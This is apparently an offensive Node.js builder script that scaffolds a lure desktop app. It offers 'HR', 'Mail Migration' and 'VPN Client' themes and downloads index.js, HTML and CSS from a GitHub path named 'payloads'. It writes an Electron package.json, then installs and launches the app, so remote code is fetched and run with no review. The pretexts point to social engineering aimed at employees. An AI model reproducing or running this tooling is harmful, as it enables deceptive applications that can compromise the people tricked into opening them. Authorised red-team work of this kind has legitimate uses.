const fs = require('fs');
const https = require('https');
const { execSync } = require('child_process');
const prompt = require('prompt-sync')();

async function main() {
    const installFolderInput = prompt('What is the folder name?\n').trim();
    fs.mkdirSync(installFolderInput, { recursive: true });
    process.chdir(installFolderInput);
    console.log(`Folder created. Trying to install into: ${process.cwd()}\n`);

    try {
        execSync('npm init -y', { stdio: 'inherit' });
        console.log('npm init completed successfully.\n');
        const choice = prompt('Which theme? 1) HR 2) Mail Migration 3) VPN Client').trim();
        await handleChoice(choice);
    } catch (error) {
        console.error('Error:', error);
    }
}

async function downloadFile(url, filename) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(filename);
        https.get(url, (response) => {
            response.pipe(file);
            file.on('finish', () => {
                file.close(resolve);
                console.log(`${filename} downloaded.`);
            });
        }).on('error', (error) => {
            fs.unlink(filename, () => {
                reject(error);
            });
        });
    });
}

async function handleChoice(choice) {
    if (choice === '1' || choice === '2' || choice === '3') {
        await downloadThemes(choice);
        console.log('Theme downloaded. Continuing to the next step\n');
        updatePackageJson();
    } else {
        console.log('Invalid choice. Please enter a valid option.');
        await main();
    }
}

async function downloadThemes(choice) {
console.log("Make a choice from these options");
    if (choice === '1' || choice === '2') {
        await Promise.all([
            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.js', 'index.js'),
            choice === '1' ? downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/index.html', 'index.html') : Promise.resolve(),
        ]);
    } else if (choice === '3') {
        await Promise.all([
            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/index.html', 'index.html'),
            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/styles.css', 'styles.css'),
            downloadFile('https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/index.js', 'index.js'),
        ]);
    }
}

function updatePackageJson() {
    try {
        if (!fs.existsSync('package.json')) {
            const basicPackageJson = {
                "name": "your-app-name",
                "version": "1.0.0",
                "description": "Your app description",
                "main": "index.js",
                "scripts": {
                    "start": "electron ."
                },
                "author": "Your Name",
                "license": "MIT"
            };
            fs.writeFileSync('package.json', JSON.stringify(basicPackageJson, null, 2));
            console.log('Created a basic package.json file.\n');
        }

        let content = fs.readFileSync('package.json', 'utf8').trim();
        if (!content) {
            const basicPackageJson = {
                "name": "your-app-name",
                "version": "1.0.0",
                "description": "Your app description",
                "main": "index.js",
                "scripts": {
                    "start": "electron ."
                },
                "author": "Your Name",
                "license": "MIT"
            };
            fs.writeFileSync('package.json', JSON.stringify(basicPackageJson, null, 2));
            console.log('Filled an empty package.json file with a basic structure.\n');
        } else {
            let packageJson = JSON.parse(content);
            packageJson.scripts.start = 'electron .';
            fs.writeFileSync('package.json', JSON.stringify(packageJson, null, 2));
        }

        console.log('package.json updated successfully.\n');
        console.log('Attempting Electron install..\n');
        installElectron();
    } catch (error) {
        console.error('Error reading/writing package.json:', error);
    }
}

function installElectron() {
    try {
        execSync('npm install electron --save-dev', { stdio: 'inherit' });
        execSync('npm run start', { stdio: 'inherit' });
    } catch (error) {
        console.error('Error installing/running Electron:', error);
    }
}

main();
